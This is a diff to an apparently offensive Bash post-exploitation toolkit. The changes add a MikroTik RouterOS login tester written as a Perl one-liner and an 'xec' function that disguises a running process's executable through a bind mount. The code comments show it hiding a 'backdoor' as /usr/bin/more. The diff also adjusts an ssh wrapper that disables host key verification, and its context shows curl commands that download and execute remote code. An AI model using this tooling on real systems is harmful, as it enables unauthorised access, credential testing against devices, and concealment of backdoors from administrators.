@@ -239,7 +239,7 @@ ssh() {
     local opts=()
     [ -z "$NOMX" ] && [ -n "$XHOME" ] && {
         [ ! -d "$XHOME" ] && hs_mkxhome
-        [ -d "$XHOME" ] && ssh -V -oControlPersist=15 &>/dev/null && {
+        [ -d "$XHOME" ] && command ssh -V -oControlPersist=15 &>/dev/null && {
             HS_INFO "Multiplexing all SSH connections over a single TCP. ${CF}[set NOMX=1 to disable]"
             opts=("-oControlMaster=auto" "-oControlPath=\"${XHOME}/.ssh-unix.%C\"" "-oControlPersist=15")
         }
@@ -250,7 +250,7 @@ ssh() {
         [[ $arg == -i* ]] && opts+=("-oBatchMode=yes") && break
     done
     [ -n "$HS_URL" ] && echo -e "May need to cut & paste: ' ${CDC}eval \"\$(curl -SsfL ${_HSURL})\"${CN}'"
-    command ssh "${HS_SSH_OPT[@]}" "${opts[@]}"  "$@"
+    command ssh "${HS_SSH_OPT[@]}" "${opts[@]}" "$@"
 }
 
 xssh() {
@@ -464,6 +464,13 @@ find_subdomains() {
 	[ $# -le 0 ] && [ -t 0 ] && set -- .
 	command -v rg >/dev/null && { rg -oaIN --no-heading "$rex" "$@" | grep -Eao "$rexf"; return; }
 	grep -Eaohr "$rex" "$@" | grep -Eo "$rexf"
+}
+
+# Test MikroTik login
+# Arguments: <IP> <USER> <PASSWD>
+mikrotik() {
+    [ "$#" -eq 3 ] || { printf '%s\n' 'Usage: mikrotik <IP> <USER> <PASSWD>' >&2; return 2; }
+    perl -MIO::Socket::INET -MDigest::MD5=md5_hex -e '$SIG{ALRM}=sub{die"timeout\n"};alarm 10;($h,$u,$p)=@ARGV;$s=IO::Socket::INET->new(PeerAddr=>$h,PeerPort=>8728,Proto=>"tcp")or die$!;$s->autoflush(1);sub r{my($n)=@_;my$b="";while(length($b)<$n){sysread($s,my$t,$n-length($b))or die"read failed\n";$b.=$t}return$b}sub w{my$n=ord(r(1));my$k=$n<128?0:$n<192?1:$n<224?2:$n<240?3:$n==240?4:die"bad length\n";$n&=127>>$k;$n=($n<<8)|ord(r(1))for 1..$k;return r($n)}$legacy=0;@q=(["/login","=name=$u","=password=$p"],["/system/resource/print"]);while($q=shift@q){for(@$q){$n=length;die"word too long\n"if$n>16383;print $s (($n<128?pack("C",$n):pack("n",$n|32768)).$_)or die$!}print $s "\0"or die$!;while(1){@a=();while(length($v=w())){push@a,$v}next unless@a;print join("\n",@a),"\n";die"API error\n"if$a[0]=~/^!(trap|fatal)$/;last if$a[0]eq"!done"}if($q->[0]eq"/login"){($c)=map{/^=ret=(.*)$/}@a;if(defined$c){die"invalid login challenge\n"unless$c=~/\A[0-9a-fA-F]{32}\z/;die"login incomplete\n"if$legacy++;unshift@q,["/login","=name=$u","=response=00".md5_hex("\0".$p.pack("H*",$c))]}}}' -- "$@"
 }
 
 # echo -n "XOREncodeThisSecret" | xor 0xfa
@@ -966,6 +973,80 @@ np() {
 	rm -rf "${_HS_NP_D:?}"
     unset _HS_NP_D
 }
+
+
+# xec [-a ARGV0] [-i [VAR=VAL...] [--]] <absolute-target> <binary> [args...]
+# Started <binary> will show as /proc/<PID>/exe -> <absolute-target>
+
+# argv[0] is $ARGV0 if set, else <binary> as typed; -a overrides both.
+# Env is inherited by default; -i restricts it to the given VAR=VAL list.
+# As a script, or in a subshell (e.g. `xec ... &`), the caller is replaced.
+# xec /usr/bin/id sleep 31337 &
+# xec -a FooBar /usr/bin/id sleep 31337 &
+# (xec -- /usr/bin/more backdoor &>/dev/null &) # Clear all env
+# (xec -i PATH="$PATH" -- /usr/bin/more backdoor &>/dev/null &) # Restrict env to PATH only
+# xec -a FooBar /usr/bin/more -- bash -c 'ls -al /proc/$$/exe; ps -o comm,exe,args -p $$;:' # Testing
+xec() {
+    local env=() clean=0 argv0= t b nm
+
+    while (( $# )); do
+        case $1 in
+            -a) (( $# >= 2 )) || { echo "xec: -a needs a value" >&2; return 2; }
+                argv0=$2
+                shift 2
+                ;;
+            -i) clean=1
+                shift
+                while [[ ${1-} == *=* ]]; do
+                    env+=("$1")
+                    shift
+                done
+                ;;
+            --) clean=1
+                shift
+                break
+                ;;
+            *)  break
+                ;;
+        esac
+    done
+
+    (( $# >= 2 )) || { echo "usage: xec [-a ARGV0] [-i [VAR=VAL...] [--]] <absolute-target> <binary> [args...]" >&2; return 2; }
+    t=$1 nm=$2
+    shift 2
+
+    [[ $t == /* ]] || { echo "xec: target must be absolute: $t" >&2; return 2; }
+    [[ -L $t ]] && { echo "xec: target is a symlink, not supported: $t" >&2; return 2; }
+    [[ -f $t ]] || { echo "xec: target is not a regular file: $t" >&2; return 2; }
+
+    b=$(command -v "$nm") || { echo "xec: not found: $nm" >&2; return 2; }
+    b=$(realpath -m -- "$b")
+    [[ -f $b && -x $b ]] || { echo "xec: not an executable: $b" >&2; return 2; }
+    argv0=${argv0:-${ARGV0:-$nm}}
+
+    local cmd=(unshare -m -- /bin/bash -c '
+        set -e
+        a=$1 t=$2 b=$3 c=$4 n=$5
+        shift 5
+        unset ARGV0
+        mount --make-rprivate /
+        mount --bind -- "$b" "$t"
+        e=()
+        while (( n-- > 0 )); do
+            e+=("$1")
+            shift
+        done
+        if (( c )); then
+            for v in $(compgen -e); do unset -- "$v" 2>/dev/null || :; done
+            for v in "${e[@]}"; do export -- "$v"; done
+        fi
+        exec -a "$a" -- "$t" "$@"
+    ' _ "$argv0" "$t" "$b" "$clean" "${#env[@]}" "${env[@]}" "$@")
+
+    { [[ ${BASH_SOURCE[0]} == "$0" ]] || (( BASH_SUBSHELL )); } && exec "${cmd[@]}"
+    "${cmd[@]}"
+}
+# [[ ${BASH_SOURCE[0]} == "$0" ]] && xec "$@"
 
 zapme() {
     local name="${1}"
@@ -2999,31 +3080,31 @@ ${CY}>>>>> ${CDC}curl -obash -SsfL '$str' && chmod 700 bash && exec ./bash -il"
 
     HS_SSH_OPT=()
     command -v ssh >/dev/null && {
-        command ssh -oStrictHostKeyChecking=accept-new -V 2>/dev/null 1>/dev/null || a="no"
-        HS_SSH_OPT+=("-oStrictHostKeyChecking=${a:-accept-new}")
+        command ssh -oStrictHostKeyChecking=accept-new -V 2>/dev/null 1>/dev/null || str="no"
+        HS_SSH_OPT+=("-oStrictHostKeyChecking=${str:-accept-new}")
         # HS_SSH_OPT+=("-oUpdateHostKeys=no")
         HS_SSH_OPT+=("-oUserKnownHostsFile=/dev/null")
         # Even if 'ssh -Q' shows the key it sometimes complains that it cant use them.
         # User can set SSH_NO_OLD before hs to disable old ciphers.
         [ -z "$SSH_NO_OLD" ] && command ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -V 2>/dev/null && HS_SSH_OPT+=("-oKexAlgorithms=+diffie-hellman-group1-sha1")
 
-        hka=""
-        [ -z "$SSH_NO_OLD" ] && command ssh -oHostKeyAlgorithms=+ssh-dss -V 2>/dev/null && hka+="ssh-dss,"
-        [ -z "$SSH_NO_OLD" ] && command ssh -oHostKeyAlgorithms=+ssh-rsa -V 2>/dev/null && hka+="ssh-rsa,"
-        [ -n "$hka" ] && HS_SSH_OPT+=("-oHostKeyAlgorithms=+${hka%,}")
+        str=""
+        [ -z "$SSH_NO_OLD" ] && command ssh -oHostKeyAlgorithms=+ssh-dss -V 2>/dev/null && str+="ssh-dss,"
+        [ -z "$SSH_NO_OLD" ] && command ssh -oHostKeyAlgorithms=+ssh-rsa -V 2>/dev/null && str+="ssh-rsa,"
+        [ -n "$str" ] && HS_SSH_OPT+=("-oHostKeyAlgorithms=+${str%,}")
 
-        pka=""
-        [ -z "$SSH_NO_OLD" ] && command ssh -oPubkeyAcceptedAlgorithms=+ssh-rsa -V 2>/dev/null && pka+="ssh-rsa,"
-        [ -n "$pka" ] && HS_SSH_OPT+=("-oPubkeyAcceptedAlgorithms=+${pka%,}")
+        str=""
+        [ -z "$SSH_NO_OLD" ] && command ssh -oPubkeyAcceptedAlgorithms=+ssh-rsa -V 2>/dev/null && str+="ssh-rsa,"
+        [ -n "$str" ] && HS_SSH_OPT+=("-oPubkeyAcceptedAlgorithms=+${str%,}")
 
-        ciphers=""
-        [ -z "$SSH_NO_OLD" ] && command ssh -oCiphers=+aes128-cbc -V 2>/dev/null && ciphers+="aes128-cbc,"
-        [ -z "$SSH_NO_OLD" ] && command ssh -oCiphers=+3des-cbc -V 2>/dev/null && ciphers+="3des-cbc,"
-        [ -n "$ciphers" ] && HS_SSH_OPT+=("-oCiphers=+${ciphers%,}")
+        str=""
+        [ -z "$SSH_NO_OLD" ] && command ssh -oCiphers=+aes128-cbc -V 2>/dev/null && str+="aes128-cbc,"
+        [ -z "$SSH_NO_OLD" ] && command ssh -oCiphers=+3des-cbc -V 2>/dev/null && str+="3des-cbc,"
+        [ -n "$str" ] && HS_SSH_OPT+=("-oCiphers=+${str%,}")
 
         HS_SSH_OPT+=("-oConnectTimeout=5")
         HS_SSH_OPT+=("-oServerAliveInterval=30")
-        unset a hka pka ciphers
+        unset str
     }
 
     _hs_enc_init
@@ -3290,7 +3371,11 @@ hs_init_shell() {
     [ -z "$_HS_HUSH" ] && [ -d "${XHOME}" ] && _HS_HUSH=1
 
     [ -z "$_HS_PATH_ORIG" ] && _HS_PATH_ORIG="$PATH"
-    #[ "${PATH:0:2}" != ".:" ] && export PATH=".:${PATH}"
+    # Remove any "." PATH:
+    PATH=":$PATH:"; while [[ $PATH == *:.:* ]]; do PATH=${PATH//:.:/:}; done; PATH=${PATH#:}; export PATH=${PATH%:}
+    for d in /usr/sbin /sbin /usr/local/bin /usr/local/sbin; do
+        [ -d "$d" ] && case ":$PATH:" in *":$d:"*) ;; *) PATH="$d:$PATH:" ;; esac
+    done
     # Might already exist.
     [ -d "$XHOME" ] && {
         _hs_xhome_init
